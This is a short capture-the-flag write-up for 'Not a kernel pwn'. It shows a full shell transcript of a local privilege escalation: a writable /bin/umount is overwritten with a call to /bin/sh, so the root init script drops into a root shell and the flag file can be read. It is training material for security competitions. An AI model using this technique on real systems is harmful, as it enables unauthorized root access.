# Not a kernel pwn

* Round: 26 (2022/09)
* Category: Misc
* Points: 100
* Solves: 3

## Description

Kernel pwn without a kernel module?

## Solution

`/bin` is writable and it is easy to see `/init` calls `/bin/umount` after the shell exits, so overwrite `/bin/umount` with `/bin/sh` and `exit` pops a root shell.

```sh
Welcome to Not a Kernel Pwn
/ $ ls
ls
bin      etc      lib      linuxrc  root     sbin     tmp      var
dev      init     lib64    proc     run      sys      usr
/ $ id
id
uid=1000 gid=1000 groups=1000
/ $ rm /bin/umount
rm /bin/umount
/ $ echo /bin/sh > /bin/umount
echo /bin/sh > /bin/umount
/ $ chmod +x /bin/umount
chmod +x /bin/umount
/ $ exit
exit
/bin/sh: can't access tty; job control turned off
/ # id
id
uid=0(root) gid=0(root)
/ # cat /root/flag.txt
cat /root/flag.txt
ictf{fake_flag}
/ # ^C
```

The idea of this challenges comes from an unintended solution (by @ptr-yudai) of `qKarachter` challenge from CrewCTF 2022, and this challenge is modified from `welkerme` from CakeCTF 2022 (still by @ptr-yudai).
